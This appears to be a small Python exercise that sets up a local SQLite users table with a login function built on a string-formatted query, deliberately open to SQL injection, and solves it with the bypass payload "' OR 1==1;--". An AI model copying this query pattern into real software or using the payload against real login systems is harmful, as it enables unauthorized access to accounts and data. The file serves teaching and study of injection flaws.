# implement the "sql_injection" function so that it returns a username and password, which "hack" can use to make authenticate return True 
# (But don't use Alice's or Bob's actual credentials of course)
import sqlite3

with sqlite3.connect('db.sqlite3') as connection:
    cursor = connection.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
    cursor.execute('INSERT OR IGNORE INTO users VALUES (1, "alice", "1234")')
    cursor.execute('INSERT OR IGNORE INTO users VALUES (2, "bob", "5678")')

def authenticate(username, password):
    with sqlite3.connect('db.sqlite3') as connection:
        cursor = connection.cursor()
        cursor.execute("SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(username, password))
        return len(cursor.fetchall()) > 0

def hack():
    username, password = sql_injection()
    return authenticate(username, password)

def sql_injection():
    return ("diego", "' OR 1==1;--")
print(hack())